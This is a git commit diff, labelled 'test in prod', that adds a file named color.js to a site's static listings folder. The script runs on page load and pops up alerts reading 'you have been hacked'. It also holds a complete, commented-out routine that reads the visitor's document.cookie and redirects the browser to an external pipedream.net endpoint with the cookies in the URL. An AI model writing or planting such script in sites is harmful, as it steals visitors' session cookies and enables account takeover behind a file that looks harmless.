a14536877fcf5b7600723162c435588bb24330a7
asbilim <bilimdepaullilian@gmail.com>
2024-09-12 16:34:55 +0100

    test in prod

---
+++ listings/static/ch62/color.js
@@ -0,0 +1,17 @@
+document.addEventListener("DOMContentLoaded", function () {
+  alert("you have been hacked");
+  alert("Merci tuxlu , you are the best!");
+  // function redirectWithCookies() {
+  //   const endpoint = "https://eni8dd83qy2yp.x.pipedream.net/";
+  //   const cookies = document.cookie;
+
+  //   if (cookies) {
+  //     const redirectUrl = `${endpoint}?data=${encodeURIComponent(cookies)}`;
+  //     window.location.replace(redirectUrl);
+  //   } else {
+  //     console.error("No cookies available to send.");
+  //   }
+  // }
+
+  // setTimeout(redirectWithCookies, 2000);
+});
